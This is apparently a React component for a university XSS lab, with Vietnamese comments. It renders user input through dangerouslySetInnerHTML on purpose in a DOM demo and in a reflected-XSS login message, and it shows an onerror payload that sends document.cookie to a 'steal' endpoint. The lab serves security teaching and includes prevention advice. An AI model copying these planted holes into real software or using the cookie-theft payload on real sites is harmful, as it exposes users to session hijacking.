import { useState } from 'react';

const XSSLab = () => {
  // State cho form đăng nhập giả lập
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loginMessage, setLoginMessage] = useState('');

  // State cho XSS demo
  const [payload, setPayload] = useState('');
  const [unsafeOutput, setUnsafeOutput] = useState('');
  const [safeOutput, setSafeOutput] = useState('');

  // Xử lý đăng nhập (có lỗi XSS reflected)
  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    // Giả lập đăng nhập thất bại với thông báo chứa email (không escape)
    // ĐÂY LÀ LỖI REFLECTED XSS
    setLoginMessage(`Đăng nhập thất bại cho email: ${email}`);
  };

  // Xử lý demo XSS
  const handleDemo = () => {
    setUnsafeOutput(payload);
    setSafeOutput(payload);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100">
      {/* Header */}
      <header className="bg-white shadow-sm border-b">
        <div className="container mx-auto px-6 py-4 flex justify-between items-center">
          <div className="text-2xl font-bold text-purple-700">🔐 XSS Lab</div>
          <nav className="space-x-6">
            <a href="#" className="text-gray-600 hover:text-purple-600">Demo</a>
            <a href="#" className="text-gray-600 hover:text-purple-600">Exploit</a>
            <a href="#" className="text-gray-600 hover:text-purple-600">Prevention</a>
          </nav>
        </div>
      </header>

      {/* Hero Section */}
      <section className="container mx-auto px-6 py-12 text-center">
        <h1 className="text-4xl md:text-5xl font-bold text-gray-800 mb-4">
          Cross-Site Scripting <span className="text-purple-700">(XSS)</span> Vulnerability Lab
        </h1>
        <p className="text-lg text-gray-600 max-w-2xl mx-auto">
          Hiểu cách hacker khai thác XSS và cách bảo vệ ứng dụng của bạn.
          Thử nghiệm với các payload độc hại trong môi trường an toàn.
        </p>
      </section>

      {/* Main Grid: Demo + Login */}
      <div className="container mx-auto px-6 py-8 grid md:grid-cols-2 gap-8">
        {/* Card: Live XSS Demo (DOM-based) */}
        <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-100">
          <div className="bg-purple-700 px-6 py-4">
            <h2 className="text-xl font-bold text-white">⚡ Live DOM XSS Demo</h2>
            <p className="text-purple-100 text-sm">Thử nghiệm với <code className="bg-purple-900 px-1 rounded">&lt;img src=x onerror=alert(1)&gt;</code></p>
          </div>
          <div className="p-6 space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Payload (HTML/JS)</label>
              <div className="flex gap-2">
                <input
                  type="text"
                  value={payload}
                  onChange={(e) => setPayload(e.target.value)}
                  placeholder='<img src=x onerror=alert("XSS")>'
                  className="flex-1 border border-gray-300 rounded-lg px-4 py-2 focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                />
                <button
                  onClick={handleDemo}
                  className="bg-purple-600 text-white px-4 py-2 rounded-lg hover:bg-purple-700 transition"
                >
                  Inject
                </button>
              </div>
            </div>

            {/* Phần có lỗi */}
            <div className="border border-red-200 rounded-xl bg-red-50 p-4">
              <div className="flex items-center gap-2 mb-2">
                <span className="text-red-600 font-bold">🔴 Vulnerable (dangerouslySetInnerHTML)</span>
              </div>
              <div className="bg-white p-3 rounded border border-red-200 min-h-[60px]">
                <div dangerouslySetInnerHTML={{ __html: unsafeOutput }} />
              </div>
              <p className="text-xs text-red-500 mt-2">Script sẽ thực thi → XSS thành công</p>
            </div>

            {/* Phần an toàn */}
            <div className="border border-green-200 rounded-xl bg-green-50 p-4">
              <div className="flex items-center gap-2 mb-2">
                <span className="text-green-600 font-bold">✅ Secure (React auto-escape)</span>
              </div>
              <div className="bg-white p-3 rounded border border-green-200 min-h-[60px]">
                {safeOutput}
              </div>
              <p className="text-xs text-green-500 mt-2">Nội dung được hiển thị dạng text, script không chạy</p>
            </div>
          </div>
        </div>

        {/* Card: Login Simulator with Reflected XSS */}
        <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-100">
          <div className="bg-gray-800 px-6 py-4">
            <h2 className="text-xl font-bold text-white">🔑 Login Simulator</h2>
            <p className="text-gray-300 text-sm">Nhập email bất kỳ – có lỗi Reflected XSS trong thông báo lỗi</p>
          </div>
          <div className="p-6">
            <form onSubmit={handleLogin} className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700">Email Address</label>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="mt-1 w-full border border-gray-300 rounded-lg px-4 py-2 focus:ring-2 focus:ring-purple-500"
                  placeholder="ialirezamp@gmail.com"
                  required
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700">Password</label>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="mt-1 w-full border border-gray-300 rounded-lg px-4 py-2 focus:ring-2 focus:ring-purple-500"
                  placeholder="••••••••"
                />
              </div>
              <button
                type="submit"
                className="w-full bg-purple-600 text-white py-2 rounded-lg hover:bg-purple-700 transition font-medium"
              >
                Continue
              </button>
            </form>

            {/* Thông báo lỗi có chứa XSS */}
            {loginMessage && (
              <div className="mt-4 p-3 bg-red-100 border border-red-300 rounded-lg text-red-700">
                {/* 🔴 CỐ TÌNH TẠO LỖI REFLECTED XSS */}
                <div dangerouslySetInnerHTML={{ __html: loginMessage }} />
                <p className="text-xs mt-1">Thông báo này không được escape → XSS nếu email chứa mã độc</p>
              </div>
            )}

            <div className="mt-6 text-center text-sm text-gray-500">
              Or continue with
              <div className="flex justify-center gap-4 mt-2">
                <button className="border border-gray-300 rounded-lg px-4 py-1 hover:bg-gray-50">Google</button>
                <button className="border border-gray-300 rounded-lg px-4 py-1 hover:bg-gray-50">GitHub</button>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Giải thích và Prevention */}
      <div className="container mx-auto px-6 py-12">
        <div className="bg-white rounded-2xl shadow-lg p-6 border-l-8 border-purple-500">
          <h3 className="text-2xl font-bold text-gray-800 mb-3">🛡️ How to Prevent XSS</h3>
          <div className="grid md:grid-cols-3 gap-6 mt-4">
            <div className="p-4 bg-gray-50 rounded-xl">
              <div className="text-purple-600 text-2xl mb-2">1️⃣</div>
              <h4 className="font-bold">Escape dynamic content</h4>
              <p className="text-sm text-gray-600">Sử dụng <code className="bg-gray-200 px-1">textContent</code> thay vì <code>innerHTML</code>. React tự động escape trong JSX.</p>
            </div>
            <div className="p-4 bg-gray-50 rounded-xl">
              <div className="text-purple-600 text-2xl mb-2">2️⃣</div>
              <h4 className="font-bold">Content Security Policy (CSP)</h4>
              <p className="text-sm text-gray-600">Chặn inline script bằng CSP header <code>script-src 'self'</code>.</p>
            </div>
            <div className="p-4 bg-gray-50 rounded-xl">
              <div className="text-purple-600 text-2xl mb-2">3️⃣</div>
              <h4 className="font-bold">Sanitize user input</h4>
              <p className="text-sm text-gray-600">Dùng thư viện như <code>DOMPurify</code> khi cần hiển thị HTML an toàn.</p>
            </div>
          </div>
          <div className="mt-6 p-3 bg-purple-50 rounded-lg text-sm text-purple-800">
            💡 <strong>Try this payload in the demo:</strong> <code className="bg-purple-100 px-1">&lt;img src=x onerror="fetch('http://localhost:4000/steal?cookie='+document.cookie)"&gt;</code>
            <br />Kết hợp với hacker-server để đánh cắp cookie.
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="bg-white border-t mt-12 py-6 text-center text-gray-500 text-sm">
        © 2025 XSS Vulnerability Lab - Dành cho môn Bảo mật & An toàn HTTT
      </footer>
    </div>
  );
};

export default XSSLab;